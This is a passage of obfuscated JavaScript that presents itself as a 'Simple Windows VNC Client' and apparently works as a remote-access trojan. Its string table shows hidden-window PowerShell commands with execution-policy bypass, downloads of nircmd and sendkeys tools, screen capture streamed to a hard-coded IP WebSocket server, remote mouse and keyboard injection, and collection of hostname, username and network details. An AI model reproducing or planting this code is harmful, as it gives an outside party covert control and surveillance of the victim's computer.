_0x4fea61=_0x16c21b;console[_0x4fea61(0x231)](_0x4fea61(0x213)),global['simpleVncClient']?global['simpleVncClient'][_0x4fea61(0x21a)]():process['exit'](0x0);});function _0x36ad(_0x36aeae,_0x426f2c){const _0x5dadbc=_0x5dad();return _0x36ad=function(_0x36ad0e,_0x1cc484){_0x36ad0e=_0x36ad0e-0x1aa;let _0x481d17=_0x5dadbc[_0x36ad0e];return _0x481d17;},_0x36ad(_0x36aeae,_0x426f2c);}process['platform']!==_0x16c21b(0x229)&&(console[_0x16c21b(0x250)](_0x16c21b(0x1b4)),process[_0x16c21b(0x221)](0x1));function _0x5dad(){const _0x10ad16=['\x20sendmouse\x20right\x20dblclick\x20','setupTools','now','register','substring','powershell\x20-WindowStyle\x20Hidden\x20-ExecutionPolicy\x20Bypass\x20-Command\x20\x22','Max\x20reconnection\x20attempts\x20reached.\x20Exiting...','config_update','error','{RIGHT}','writeFileSync','powershell\x20-WindowStyle\x20Hidden\x20-Command\x20\x22[System.Windows.Forms.Cursor]::Position\x20=\x20New-Object\x20System.Drawing.Point(','child_process','streamInterval','powershell','34300UyNQDm','Failed\x20to\x20get\x20screen\x20resolution:','369wtdeZm','{F5}','captureScreen','\x20setcursor\x20','get','send','compression','start_stream','update','Sharp\x20image\x20processing:\x20Not\x20available','max','compressionRatio','$graphics\x20=\x20[System.Drawing.Graphics]::FromImage($bitmap);\x20','https://github.com/michaellukashov/sendkeys/releases/download/v1.2/sendkeys.exe','middle','Failed\x20to\x20send\x20data\x20to\x20server:','ENTER','hasSharp','\x20sendmouse\x20middle\x20dblclick\x20','HOME','{END}','values','Downloading\x20SendKeys\x20utility...','{F7}','getScreenResolution','pong','homedir','lanczos3','sharp','mapPowerShellKey','NirCmd:\x20Downloaded\x20and\x20extracted','https://www.nirsoft.net/utils/nircmd.zip','doubleclick','END','screenWidth','fps,\x20quality:\x20','screenHeight','%,\x20compression:\x20','nircmd.exe','frameCount','serverUrl','Connected\x20to\x20VNC\x20server','scheduleReconnect','14571460TGYeLS','{DELETE}','move','ws://65.87.7.58:8083','powershell\x20-Command\x20\x22Add-Type\x20-AssemblyName\x20System.Windows.Forms;\x20$screen\x20=\x20[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;\x20Write-Output\x20($screen.Width.ToString()\x20+\x20\x27x\x27\x20+\x20$screen.Height.ToString())\x22','{F10}','pow','powershell\x20-Command\x20\x22','click','message','{F11}','env','match','data','\x20-\x20','toBuffer','clientId','handleNirCmdMouse','\x20sendmouse\x20middle\x20click\x20','\x27\x20-Force\x22','Download\x20failed:\x20','125940cjYPhk','initializeSendKeys','11040073uohwUY','Add-Type\x20-AssemblyName\x20System.Windows.Forms;\x20','powershell\x20-WindowStyle\x20Hidden\x20-Command\x20\x22Add-Type\x20-AssemblyName\x20System.Windows.Forms;\x20[System.Windows.Forms.SendKeys]::SendWait(\x27','PowerShell\x20mouse\x20error:','https','md5','\x27)\x22','unlinkSync','36blxiaK','handleKeyboardEvent','initializeNirCmd','Screenshot\x20capture\x20failed:','handlePowerShellMouse','hasNirCmd','sendkeysPath','finish','Connecting\x20to\x20VNC\x20server:\x20','stopStreaming','alt','nircmd','This\x20VNC\x20client\x20only\x20works\x20on\x20Windows\x20systems','handleSendKeysKeyboard','location','4HrtPSZ','stream_started','hex','mapSendKeysKey','$graphics.Dispose();\x20','unlink','downloadSendKeys','push','$bitmap.Dispose()\x22','{HOME}','SIGTERM','readyState','execCommand','statusCode','flat','{LEFT}','Starting\x20screen\x20stream','Start-Sleep\x20-Milliseconds\x2050;\x20','SendKeys\x20keyboard\x20error:','ctrl','username','PowerShell\x20keyboard\x20error:','abs','connectToServer','right','287OZKvcK','handleServerMessage','resize','SendKeys\x20setup\x20failed:','down','close','sendToServer','SendKeys:\x20Downloaded\x20successfully','replace','Sharp\x20image\x20processing:\x20Available','digest','round','F11','hostname','Downloading\x20NirCmd...','tempDir','concat','{UP}','nircmdPath','maxReconnectAttempts','915824tQSvmC','config','TAB','map','hasSendKeys','LEFT','nircmd.zip','\x0aReceived\x20SIGINT\x20signal','Starting\x20Simple\x20Windows\x20VNC\x20Client...','type','readFileSync','updateConfig','crypto','jpeg','SendKeys:\x20Already\x20available','{BACKSPACE}','registerClient','455683FicHcu','{F3}','$screen\x20=\x20[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;\x20','Shutting\x20down\x20VNC\x20client...','Registration\x20confirmed\x20by\x20server','{F2}','reconnectAttempts','userInfo','SPACE','reconnectDelay','screenshot_','existsSync','$graphics.CopyFromScreen($screen.Location,\x20[System.Drawing.Point]::Empty,\x20$screen.Size);\x20','3368205nhJaqn','cleanup','{DOWN}',');\x20','stringify','mac','end','Connection\x20failed:','{INSERT}','VNC_SERVER','{PGDN}','min','isStreaming','base64','Initializing\x20Simple\x20Windows\x20VNC\x20Client...','startPingPong','path','Received\x20SIGTERM\x20signal','networkInterfaces','{F1}','{F9}','find','parse','Command\x20failed:\x20','gracefulShutdown','stop_stream','PGDN','NirCmd\x20setup\x20failed:','shift','Failed\x20to\x20handle\x20server\x20message:','tmpdir','exit','Add-Type\x20-AssemblyName\x20System.Drawing;\x20','\x27,\x20[System.Drawing.Imaging.ImageFormat]::Png);\x20','{F4}','\x20\x22{','press','NirCmd:\x20Already\x20available','generateClientId','win32','join','DOWN','NirCmd\x20mouse\x20error:','floor','[Win32]::mouse_event(0x0002,\x200,\x200,\x200,\x200);\x20Start-Sleep\x20-Milliseconds\x2050;\x20[Win32]::mouse_event(0x0004,\x200,\x200,\x200,\x200)\x22','keyboard_event','length','log','fps','OPEN','pingInterval','Stream\x20stopped','{F12}','Screenshot\x20file\x20not\x20created','toLowerCase','Updating\x20config:','ESC','F12','toString','{F6}','captureAndSendScreen','.png','{F8}','quality','handlePowerShellKeyboard','WebSocket\x20error:','SIGINT','init','\x20sendmouse\x20right\x20click\x20','nircmdc.exe'];_0x5dad=function(){return _0x10ad16;};return _0x5dad();}console[_0x16c21b(0x231)](_0x16c21b(0x1ec)),global['simpleVncClient']=new SimpleWindowsVNC();
